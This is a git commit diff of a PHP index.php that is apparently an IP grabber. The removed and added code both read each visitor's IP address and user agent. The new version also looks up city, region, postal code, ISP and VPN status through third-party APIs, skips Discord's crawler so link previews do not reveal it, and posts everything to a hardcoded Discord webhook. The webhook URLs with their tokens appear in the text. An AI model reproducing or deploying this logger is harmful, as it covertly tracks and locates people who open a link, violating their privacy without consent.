1d9b15e4fb984623c6411a53358e56bc19bf0c57
zare <76932502+lvzare@users.noreply.github.com>
2021-08-30 00:13:21 +0400

    Update index.php

--- index.php
+++ index.php
@@ -1,91 +1,40 @@
-<?php
-$webhook = "https://discord.com/api/webhooks/880814875704717373/9Qm_5eLtE7g9kOdqnCkxJ37pnD2alu1v9dENHpuL6pr9seMFvb516UOnCvchUrHeh6Kz"; //<------------     WEBHOOK HERE    
-$timezonehere = "Asia"; //<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
-$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
-function getOS() { 
-    global $user_agent;
-    $os_platform    =   "Unknown OS Platform";
-    $os_array       =   array(
-                            '/windows nt 10/i'     =>  'Windows 10',
-                            '/windows nt 6.3/i'     =>  'Windows 8.1',
-                            '/windows nt 6.2/i'     =>  'Windows 8',
-                            '/windows nt 6.1/i'     =>  'Windows 7',
-                            '/windows nt 6.0/i'     =>  'Windows Vista',
-                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
-                            '/windows nt 5.1/i'     =>  'Windows XP',
-                            '/windows xp/i'         =>  'Windows XP',
-                            '/windows nt 5.0/i'     =>  'Windows 2000',
-                            '/windows me/i'         =>  'Windows ME',
-                            '/win98/i'              =>  'Windows 98',
-                            '/win95/i'              =>  'Windows 95',
-                            '/win16/i'              =>  'Windows 3.11',
-                            '/macintosh|mac os x/i' =>  'Mac OS X',
-                            '/mac_powerpc/i'        =>  'Mac OS 9',
-                            '/linux/i'              =>  'Linux',
-							'/kalilinux/i'          =>  'KaliLinux',
-                            '/ubuntu/i'             =>  'Ubuntu',
-                            '/iphone/i'             =>  'iPhone',
-                            '/ipod/i'               =>  'iPod',
-                            '/ipad/i'               =>  'iPad',
-                            '/android/i'            =>  'Android',
-                            '/blackberry/i'         =>  'BlackBerry',
-                            '/webos/i'              =>  'Mobile',
-							'/Windows Phone/i'      =>  'Windows Phone'
-                        );
-    foreach ($os_array as $regex => $value) { 
-        if (preg_match($regex, $user_agent)) {
-            $os_platform    =   $value;
-        }
-    }   
-    return $os_platform;
-}
-function getBrowser() {
-    global $user_agent;
-    $browser        =   "Unknown Browser";
-    $browser_array  =   array(
-                            '/msie/i'       =>  'Internet Explorer',
-                            '/firefox/i'    =>  'Firefox',
-							'/Mozilla/i'	=>	'Mozila',
-							'/Mozilla/5.0/i'=>	'Mozila',
-                            '/safari/i'     =>  'Safari',
-                            '/chrome/i'     =>  'Chrome',
-                            '/edge/i'       =>  'Edge',
-                            '/opera/i'      =>  'Opera',
-							'/OPR/i'        =>  'Opera',
-                            '/netscape/i'   =>  'Netscape',
-                            '/maxthon/i'    =>  'Maxthon',
-                            '/konqueror/i'  =>  'Konqueror',
-							'/Bot/i'		=>	'BOT Browser',
-							'/Valve Steam GameOverlay/i'  =>  'Steam',
-                            '/mobile/i'     =>  'Handheld Browser'
-                        );
-    foreach ($browser_array as $regex => $value) { 
-        if (preg_match($regex, $user_agent)) {
-            $browser    =   $value;
-        }
-    }
-    return $browser;
-}
-$user_os        =   getOS();
-$user_browser   =   getBrowser();
+/* 
+Please keep this copyright statemnet in tact
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$site_refer = $_SERVER['HTTP_REFERER'];
-	if($site_refer == ""){
-		$site = "dirrect connection";
-	}
-else{
-		$site = $site_refer;
-	}
-date_default_timezone_set('$timezonehere');
-$time = date('Y-m-d H:i:s');
-$make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time\n"));
-$exec = curl_init("$webhook"); 
-curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-curl_setopt( $exec, CURLOPT_POST, 1);
-curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
-curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $exec, CURLOPT_HEADER, 0);
-curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
-$response = curl_exec( $exec );
+
+*/ 
+
+<?php
+
+        $webhookurl = "https://discord.com/api/webhooks/881632067673272390/tYWpJjQbQD0gMVcph43tIEaFB-Y1NpZHFRZiOvtcSO9bbUuvUboeCJBDbtxjlQqUnoze";
+
+        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
+        $browser = $_SERVER['HTTP_USER_AGENT'];
+        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
+            exit();
+        }
+        $TheirDate = date('d/m/Y');
+        $TheirTime = date('G:i:s');
+        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
+        if($vpnCon->connection_type==="Corporate"){
+            $vpn = "Yes (Double Check: $details->isp)";
+        }else{
+            $vpn = "No (Double Check: $details->isp)";
+        }
+        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
+        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
+
+        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
+        $make_json = json_encode($json_data);
+        $ch = curl_init( $webhookurl );
+
+        curl_setopt( $ch, CURLOPT_POST, 1);
+        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
+        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt( $ch, CURLOPT_HEADER, 0);
+        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+        $response = curl_exec( $ch );
+
 ?>
